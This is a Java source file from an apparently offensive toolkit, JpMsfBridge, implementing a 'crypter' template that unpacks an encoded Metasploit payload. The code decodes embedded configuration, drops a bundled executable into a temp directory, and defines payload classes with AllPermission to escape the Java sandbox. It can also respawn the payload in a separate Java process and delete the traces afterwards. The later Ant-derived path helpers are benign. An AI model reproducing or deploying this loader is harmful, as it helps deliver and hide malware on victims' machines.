/*
 * JpMsfBridge.
 * 
 * Copyright (c) 2010 - 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package jpmsfbridge.crypter;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.Locale;
import java.util.Properties;
import java.util.Stack;
import java.util.StringTokenizer;

import sun.reflect.Reflection;

public class PayloadTemplate extends ClassLoader {

	private static final String METASPLOIT_DAT = "metasploit.dat";
	private final byte[] metasploitDat;

	private PayloadTemplate(ProtectionDomain pd, byte[] metasploitDat, byte[][] payloadClasses) throws Exception {
		super(Reflection.getCallerClass(1).getClassLoader());
		this.metasploitDat = metasploitDat;
		Class clazz = null;
		for (int i = 0; i < payloadClasses.length; i++) {
			clazz = defineClass(null, payloadClasses[i], 0, payloadClasses[i].length, pd);
		}
		clazz.getMethod("main", new Class[] { Class.forName("[Ljava.lang.String;") }).invoke(null, new Object[] { null });
	}

	public InputStream getResourceAsStream(String name) {
		try {
			URL url = super.getResource(name);
			if (url != null)
				return url.openStream();
			if (name.equals(METASPLOIT_DAT))
				return new ByteArrayInputStream(metasploitDat);
			return null;
		} catch (IOException e) {
			return null;
		}
	}

	public static void main(String[] args) throws Exception {
		DataInputStream dis = new DataInputStream(new ByteArrayInputStream("ENCODED_DATA".getBytes("ISO-8859-1")));
		byte[] metasploitDat = new byte[dis.readInt()];
		dis.readFully(metasploitDat);
		Properties props = new Properties();
		props.load(new ByteArrayInputStream(metasploitDat));
		int spawn = Integer.parseInt(props.getProperty("Spawn", "0"));
		if (args != null && args.length == 1) {
			spawn = Integer.parseInt(args[0]);
		}
		if (spawn > 0) {
			spawn--;
			File dummyTempFile = File.createTempFile("~spawn", ".tmp");
			dummyTempFile.delete();
			File tempDir = new File(dummyTempFile.getAbsolutePath() + ".dir");
			String clazzFile = "metasploit/Payload.class";
			File classFile = new File(tempDir, clazzFile);
			classFile.getParentFile().mkdirs();
			InputStream in = Class.forName("metasploit.DecryptedPayload").getResourceAsStream("/metasploit/Payload.class");
			FileOutputStream fos = new FileOutputStream(classFile);
			byte[] buf = new byte[4096];
			int len;
			while ((len = in.read(buf)) != -1) {
				fos.write(buf, 0, len);
			}
			fos.close();
			Process proc = Runtime.getRuntime().exec(new String[] {
					getJreExecutable("java"),
					"-classpath",
					tempDir.getAbsolutePath(),
					"metasploit.Payload",
					String.valueOf(spawn)
			});
			proc.getInputStream().close();
			proc.getErrorStream().close();
			Thread.sleep(2000);
			File[] files = new File[] {
					classFile, classFile.getParentFile(), tempDir
			};
			for (int i = 0; i < files.length; i++) {
				for (int j = 0; j < 10; j++) {
					if (files[i].delete())
						break;
					files[i].deleteOnExit();
					Thread.sleep(100);
				}
			}
			return;
		}
		props.remove("Spawn");
		byte[] exe = new byte[dis.readInt()];
		dis.readFully(exe);
		String executableName = props.getProperty("Executable");
		if (exe.length > 0 && executableName != null) {
			File dummyTempFile = File.createTempFile("~spawn", ".tmp");
			dummyTempFile.delete();
			File tempDir = new File(dummyTempFile.getAbsolutePath() + ".dir");
			tempDir.mkdir();
			File executableFile = new File(tempDir, executableName);
			FileOutputStream fos = new FileOutputStream(executableFile);
			fos.write(exe);
			fos.close();
			props.remove("Executable");
			props.put("DroppedExecutable", executableFile.getCanonicalPath());
		}
		ByteArrayOutputStream newMetasploitDat = new ByteArrayOutputStream();
		props.store(newMetasploitDat, null);
		byte[][] classes = new byte[dis.readInt()][];
		for (int i = 0; i < classes.length; i++) {
			classes[i] = new byte[dis.readInt()];
			dis.readFully(classes[i]);
		}
		final Permissions permissions = new Permissions();
		permissions.add(new AllPermission());
		final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
		new PayloadTemplate(pd, newMetasploitDat.toByteArray(), classes);
	}
	
	///
	/// The rest of the file is based on code from Apache Ant 1.8.1
	///
    private static final String OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
    private static final String PATH_SEP = System.getProperty("path.separator");
    
    private static final boolean IS_AIX = "aix".equals(OS_NAME);
    private static final boolean IS_DOS = PATH_SEP.equals(";");
    private static final String JAVA_HOME = System.getProperty("java.home");

    private static String getJreExecutable(String command) {
        File jExecutable = null;

        if (IS_AIX) {
            // On IBM's JDK 1.2 the directory layout is different, 1.3 follows
            // Sun's layout.
            jExecutable = findInDir(JAVA_HOME + "/sh", command);
        }

        if (jExecutable == null) {
            jExecutable = findInDir(JAVA_HOME + "/bin", command);
        }

        if (jExecutable != null) {
            return jExecutable.getAbsolutePath();
        } else {
            // Unfortunately on Windows java.home doesn't always refer
            // to the correct location, so we need to fall back to
            // assuming java is somewhere on the PATH.
            return addExtension(command);
        }
    }

    private static String addExtension(String command) {
        // This is the most common extension case - exe for windows and OS/2,
        // nothing for *nix.
        return command + (IS_DOS ? ".exe" : "");
    }

    private static File findInDir(String dirName, String commandName) {
        File dir = normalize(dirName);
        File executable = null;
        if (dir.exists()) {
            executable = new File(dir, addExtension(commandName));
            if (!executable.exists()) {
                executable = null;
            }
        }
        return executable;
    }

    private static File normalize(final String path) {
        Stack s = new Stack();
        String[] dissect = dissect(path);
        s.push(dissect[0]);

        StringTokenizer tok = new StringTokenizer(dissect[1], File.separator);
        while (tok.hasMoreTokens()) {
            String thisToken = tok.nextToken();
            if (".".equals(thisToken)) {
                continue;
            }
            if ("..".equals(thisToken)) {
                if (s.size() < 2) {
                    // Cannot resolve it, so skip it.
                    return new File(path);
                }
                s.pop();
            } else { // plain component
                s.push(thisToken);
            }
        }
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < s.size(); i++) {
            if (i > 1) {
                // not before the filesystem root and not after it, since root
                // already contains one
                sb.append(File.separatorChar);
            }
            sb.append(s.elementAt(i));
        }
        return new File(sb.toString());
    }
    
    private static String[] dissect(String path) {
        char sep = File.separatorChar;
        path = path.replace('/', sep).replace('\\', sep);
        // make sure we are dealing with an absolute path
        String root = null;
        int colon = path.indexOf(':');
        if (colon > 0 && IS_DOS) {

            int next = colon + 1;
            root = path.substring(0, next);
            char[] ca = path.toCharArray();
            root += sep;
            //remove the initial separator; the root has it.
            next = (ca[next] == sep) ? next + 1 : next;

            StringBuffer sbPath = new StringBuffer();
            // Eliminate consecutive slashes after the drive spec:
            for (int i = next; i < ca.length; i++) {
                if (ca[i] != sep || ca[i - 1] != sep) {
                    sbPath.append(ca[i]);
                }
            }
            path = sbPath.toString();
        } else if (path.length() > 1 && path.charAt(1) == sep) {
            // UNC drive
            int nextsep = path.indexOf(sep, 2);
            nextsep = path.indexOf(sep, nextsep + 1);
            root = (nextsep > 2) ? path.substring(0, nextsep + 1) : path;
            path = path.substring(root.length());
        } else {
            root = File.separator;
            path = path.substring(1);
        }
        return new String[] {root, path};
    }
}
